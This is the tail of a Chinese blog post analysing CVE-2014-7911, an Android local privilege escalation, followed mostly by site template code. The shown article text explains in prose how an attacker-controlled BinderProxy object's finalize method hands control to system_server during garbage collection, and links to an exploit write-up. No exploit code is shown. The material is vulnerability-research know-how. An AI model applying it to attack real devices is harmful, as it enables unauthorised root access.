<p>第二个问题，为什么要将AAdroid.os.BinderProxy修改为Android.os.BinderProxy？<br>漏洞的整个触发过程仅仅是向system_server进程传递了一个恶意对象实例，此时没有任何该对象的方法或者数据被使用，然而由于Java GC机制，当该对象被清理时，GC将调用他的finalize方法。由于finalize方法是不可控的，可控仅仅是该恶意对象，所以漏洞仍然无法利用。回头再看Android.os.BinderProxy，它在其finalize方法中将变量mObject和mOrgue强制转换为函数指针并调用。但是其中mObject和mOrgue的值是可控的，这样就相当于可以向system_server传递一个任意值的函数指针this，并在该对象实例被GC时有机会获得控制权。</p>
<h2 id="漏洞利用">漏洞利用</h2><p><a href="http://blog.idhyt.com/2015/08/01/exploit-cve-2014-7911-exp/">CVE-2014-7911安卓本地提权漏洞利用</a></p>
<h2 id="参考">参考</h2><p><a href="http://ele7enxxh.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html" target="_blank" rel="external">CVE-2014-7911安卓本地提权漏洞详细分析</a></p>
</span>
      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/cve/" rel="tag">#cve</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-prev post-nav-item">
            
              <a href="/2015/08/01/exploit-cve-2014-7911-exp/" rel="prev">CVE-2014-7911安卓本地提权漏洞利用</a>
            
          </div>

          <div class="post-nav-next post-nav-item">
            
              <a href="/2015/05/11/android-reverse-clickbutton/" rel="next">安卓逆向学习笔记-ClickButton</a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div>
      
        <style type="text/css">

    .donate_bar {
        text-align: center;
        margin-top : 5%;
    }

    .donate_bar.hidden {
        display:none;
    }
/*
    .donate_bar a.btn_donate {
        display: inline-block;
        width: 82px;
        height: 82px;
        margin-left:auto;
        margin-right:auto;

        background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat;
        _background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat; 

        -webkit-transition: background 0s;
        -moz-transition: background 0s;
        -o-transition: background 0s;
        -ms-transition: background 0s;
        transition: background 0s;
    }
*/
    .donate_bar a.btn_donate:hover { 
        // background-position: 0px -82px;
        color: #87daff
    }

    .donate_bar .donate_txt {
        display: block;
        color: #9d9d9d;
        font: 14px/2 "Microsoft Yahei";
    }

    .bold { 
        font-weight: bold; 
    }

    .post-donate a {
        border-bottom: 0px;
    }

    #donate_guide table {
        border: none;
    }

    #donate_guide td {
        border-bottom: none;
        border-right: none;
        background: #333333;
        valign: top;
    }

</style>



    

    <div class ="post-donate">
        <div id="donate_board" class="donate_bar center">
              <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏">赏</a>
              <span id="donate_txt" class="donate_txt">
                   
                        仅仅是一个功能
                   
              </span>
            <br>
        </div>  
  
        <div id="donate_guide" class="donate_bar center hidden">
            <!--
            
                <a href="http://o7keinrz4.bkt.clouddn.com/alipay.jpg" title="支付宝打赏" class="fancybox" rel="article0" 
                    style="float:left;margin-left:25%;margin-right:10px;">
                    <img src="http://o7keinrz4.bkt.clouddn.com/alipay.jpg" title="" height="164px" width="164px">
                </a> 
              

            
                <a href="http://o7keinrz4.bkt.clouddn.com/wechat.jpg" title="微信打赏" class="fancybox" rel="article0"
                    style="margin-right:30%">
                    <img src="http://o7keinrz4.bkt.clouddn.com/wechat.jpg" title="" height="164px" width="164px">
                </a>
            
            -->
            <table>
                <tr>
                    <td>
                        
                            <a href="http://o7keinrz4.bkt.clouddn.com/alipay.jpg" title="支付宝打赏" class="fancybox" rel="article0" 
                                style="float:left;margin-left:25%;margin-right:10px;">
                                <img src="http://o7keinrz4.bkt.clouddn.com/alipay.jpg" title="" height="164px" width="164px">
                            </a> 
                         
                    </td>
                    <td>
                        
                            <a href="http://o7keinrz4.bkt.clouddn.com/wechat.jpg" title="微信打赏" class="fancybox" rel="article0"
                                style="margin-right:30%">
                                <img src="http://o7keinrz4.bkt.clouddn.com/wechat.jpg" title="" height="164px" width="164px">
                            </a>
                        
                    </td>
                </tr>
            </table>

        </div>

        <script type="text/javascript">
            document.getElementById('btn_donate').onclick = function() {
                $('#donate_board').addClass('hidden');
                // $('#donate_guide').removeClass('hidden');
                $('#donate_guide').show(2000);
            }

        </script>
    </div>

    


      
    </div>

    <div class="post-spread">
      
        <div class="bdsharebuttonbox">
	<a href="#" class="bds_more" data-cmd="more"></a>
	<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
	<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
	<a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
	<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
	<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
	<a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
</div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>

      
    </div>
  </div>

 </div>

        

        
          <div class="comments" id="comments">
            
              <div id="disqus_thread">
                <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
              </div>
            
          </div>
        
      </div>

      
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/default_avatar.jpg" alt="idhyt" itemprop="image"/>
          <p class="site-author-name" itemprop="name">idhyt</p>
        </div>
        <p class="site-description motion-element" itemprop="description">水中月.镜中花.浮华一片苍凉..</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">58</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            <a href="/categories">
              <span class="site-state-item-count">7</span>
              <span class="site-state-item-name">分类</span>
              </a>
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">31</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="menu-item-icon icon-next-feed"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="http://github.com/idhyt" target="_blank">GitHub</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/1706893103" target="_blank">Weibo</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.zhihu.com/people/idhyt" target="_blank">ZhiHu</a>
              </span>
            
          
        </div>

        <div class="links-of-friendly motion-element">
          
            <p class="site-author-name">Links</p>
            
              <span class="links-of-author-item">
              <a href="http://blog.idhyt.com/about/" target="_blank">招租</a>
              </span>
            
          
        </div>

        
        
          <div class="cc-license motion-element" itemprop="license">
            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
            </a>
          </div>
        

      </section>

      
        <section class="post-toc-wrap sidebar-panel-active">
          <div class="post-toc-indicator-top post-toc-indicator"></div>
          <div class="post-toc">
            
            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调试环境和工具"><span class="nav-number">2.</span> <span class="nav-text">调试环境和工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞触发"><span class="nav-number">3.</span> <span class="nav-text">漏洞触发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#触发"><span class="nav-number">3.1.</span> <span class="nav-text">触发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#崩溃日志"><span class="nav-number">3.2.</span> <span class="nav-text">崩溃日志</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#几个重要的寄存器"><span class="nav-number">3.3.</span> <span class="nav-text">几个重要的寄存器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞POC分析"><span class="nav-number">4.</span> <span class="nav-text">漏洞POC分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞触发过程"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞触发过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#进程间通信"><span class="nav-number">4.2.</span> <span class="nav-text">进程间通信</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Binder"><span class="nav-number">4.2.1.</span> <span class="nav-text">Binder</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#service_manager和binder_service"><span class="nav-number">4.2.2.</span> <span class="nav-text">service manager和binder service</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞触发过程中数据的parcel和unparcel"><span class="nav-number">4.3.</span> <span class="nav-text">漏洞触发过程中数据的parcel和unparcel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">5.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Android指针管理"><span class="nav-number">5.1.</span> <span class="nav-text">Android指针管理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GC机制"><span class="nav-number">5.2.</span> <span class="nav-text">GC机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞成因"><span class="nav-number">5.3.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反汇编定位崩溃点"><span class="nav-number">5.4.</span> <span class="nav-text">反汇编定位崩溃点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思考"><span class="nav-number">6.</span> <span class="nav-text">思考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">7.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">8.</span> <span class="nav-text">参考</span></a></li></ol></div>
            
          </div>
          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
        </section>
      

    </div>
  </aside>


    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner"> <div class="copyright" >
  
  &copy; &nbsp;  2011 - 
  <span itemprop="copyrightYear">2016</span>
  <span class="with-love">
    <i class="icon-next-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">idhyt</span>

  <div class="powered-by"></div>
  <div class="powered-by">
    Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
  </div>

  <div class="theme-info">
    Theme by <a class="theme-link" href="http://blog.idhyt.com">idhyt</a>.<a class="theme-link" href="https://github.com/idhyt/hexo-theme-next/tree/magiclamp">Mala</a>
  </div>

  <!-- busuanzi -->
  

</div>

<!--
<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Mala
  </a>
</div>
-->

<!--
<div class="powered-by"></div>
<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>
-->

<!-- busuanzi -->
<!--

-->


 </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  
  
    
    

  
    <script type="text/javascript">
      var disqus_shortname = 'idhyt';
      var disqus_identifier = '2015/07/31/exploit-cve-2014-7911/';
      var disqus_title = 'CVE-2014-7911安卓本地提权漏洞分析';
      var disqus_url = 'http://blog.idhyt.com/2015/07/31/exploit-cve-2014-7911/';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      var disqus_forbid = true;
      function google_forbid() {
        disqus_forbid = true;
      }

      function google_allow() {
        disqus_forbid = false;
      }

    </script>

    

      <style type="text/css">
        .show-commit-btn {
            text-align: center;
            margin-top: 5%;
            display: inline-block;
            color: #ddd;
            font: 14px/2 "Microsoft Yahei";
            background: #444;
            padding: 1px 5px;
            border-bottom: none;
            // background:url("data:image/svg+xml;base64,PD94bWwgdm3Mz4=") no-repeat 0 50%
            // background:url("http//xxxx.gif") no-repeat 0 
        }
        .show-commit-cls a:hover { 
            // background-position: 0px -82px;
            color: #87daff;
            background: none;
        }

        .show-commit-dsp {
            text-align: center;
            font: 14px/2 "Microsoft Yahei";
            color: #ddd;
            margin-top: 5%;
        }
      </style>


      <script type="text/javascript">

        var disqus_loaded = false;

        var show_btn = 
          '<div class="show-commit-cls">  \
            <a id="show_commit_btn" class="show-commit-btn" href="javascript:;" title="评论">评论/查看评论</a>  \
            <div id="show_commit_dsp" class="show-commit-dsp"> Disqus评论可能被墙</div> \
          </div>';
        var comments = document.getElementById("comments");
        comments.insertAdjacentHTML("beforeBegin", show_btn);

        $('.show-commit-dsp').hide();

        document.getElementById('show_commit_btn').onclick = function() {
          if (!disqus_loaded) {
            disqus_loaded = true;
            $('.show-commit-btn').hide();

            run_disqus_script('count.js');
            
              run_disqus_script('embed.js');
            

            if (disqus_forbid && $('.show-commit-dsp').css("display") == "none") {
              $('.show-commit-dsp').show(1500);
            }

          }

        }

      </script>

      <img src="https://lh4.googleusercontent.com/-lOxRXbE0_FM/V59i2VnJDxI/AAAAAAAAAAg/f2MXiY-UaAc7_f1rJXOtpQ1lbNjqRF0MQCL0B/w142-h135/disqus.jpg" style="display: none" onload="google_allow()" onerror="google_forbid()"/>

    

  


  
  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
  

  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>




  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  
<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>


<script type="text/javascript" id="sidebar.toc.highlight">
  $(document).ready(function () {
    var tocSelector = '.post-toc';
    var $tocSelector = $(tocSelector);
    var activeCurrentSelector = '.active-current';

    $tocSelector
      .on('activate.bs.scrollspy', function () {
        var $currentActiveElement = $(tocSelector + ' .active').last();

        removeCurrentActiveClass();
        $currentActiveElement.addClass('active-current');

        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
      })
      .on('clear.bs.scrollspy', function () {
        removeCurrentActiveClass();
      });

    function removeCurrentActiveClass () {
      $(tocSelector + ' ' + activeCurrentSelector)
        .removeClass(activeCurrentSelector.substring(1));
    }

    function processTOC () {
      getTOCMaxHeight();
      toggleTOCOverflowIndicators();
    }

    function getTOCMaxHeight () {
      var height = $('.sidebar').height() -
                   $tocSelector.position().top -
                   $('.post-toc-indicator-bottom').height();

      $tocSelector.css('height', height);

      return height;
    }

    function toggleTOCOverflowIndicators () {
      tocOverflowIndicator(
        '.post-toc-indicator-top',
        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
      );

      tocOverflowIndicator(
        '.post-toc-indicator-bottom',
        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
      )
    }

    $(document).on('sidebar.motion.complete', function () {
      processTOC();
    });

    $('body').scrollspy({ target: tocSelector });
    $(window).on('resize', function () {
      if ( $('.sidebar').hasClass('sidebar-active') ) {
        processTOC();
      }
    });

    onScroll($tocSelector);

    function onScroll (element) {
      element.on('mousewheel DOMMouseScroll', function (event) {
          var oe = event.originalEvent;
          var delta = oe.wheelDelta || -oe.detail;

          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
          event.preventDefault();

          toggleTOCOverflowIndicators();
      });
    }

    function tocOverflowIndicator (indicator, action) {
      var $indicator = $(indicator);
      var opacity = action === 'show' ? 0.4 : 0;
      $indicator.velocity ?
        $indicator.velocity('stop').velocity({
          opacity: opacity
        }, { duration: 100 }) :
        $indicator.stop().animate({
          opacity: opacity
        }, 100);
    }

  });
</script>

<script type="text/javascript" id="sidebar.nav">
  $(document).ready(function () {
    var html = $('html');
    var TAB_ANIMATE_DURATION = 200;
    var hasVelocity = $.isFunction(html.velocity);

    $('.sidebar-nav li').on('click', function () {
      var item = $(this);
      var activeTabClassName = 'sidebar-nav-active';
      var activePanelClassName = 'sidebar-panel-active';
      if (item.hasClass(activeTabClassName)) {
        return;
      }

      var currentTarget = $('.' + activePanelClassName);
      var target = $('.' + item.data('target'));

      hasVelocity ?
        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
          target
            .velocity('stop')
            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
            .addClass(activePanelClassName);
        }) :
        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
          currentTarget.hide();
          target
            .stop()
            .css({'opacity': 0, 'display': 'block'})
            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
              currentTarget.removeClass(activePanelClassName);
              target.addClass(activePanelClassName);
            });
        });

      item.siblings().removeClass(activeTabClassName);
      item.addClass(activeTabClassName);
    });

    $('.post-toc a').on('click', function (e) {
      e.preventDefault();
      var targetSelector = escapeSelector(this.getAttribute('href'));
      var offset = $(targetSelector).offset().top;
      hasVelocity ?
        html.velocity('stop').velocity('scroll', {
          offset: offset  + 'px',
          mobileHA: false
        }) :
        $('html, body').stop().animate({
          scrollTop: offset
        }, 500);
    });

    // Expand sidebar on post detail page by default, when post has a toc.
    var $tocContent = $('.post-toc-content');
    if (isDesktop() && CONFIG.sidebar === 'post') {
      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
        displaySidebar();
      }
    }
  });
</script>



  <script type="text/javascript">
    $(document).ready(function () {
      if (CONFIG.sidebar === 'always') {
        displaySidebar();
      }
      if (isMobile()) {
        FastClick.attach(document.body);
      }
    });
  </script>

  

  
  

  
  <script type="text/javascript" src="/js/lazyload.js"></script>
  <script type="text/javascript">
    $(function () {
      $("#posts").find('img').lazyload({
        placeholder: "/images/loading.gif",
        effect: "fadeIn"
      });
    });
  </script>
</body>
</html>
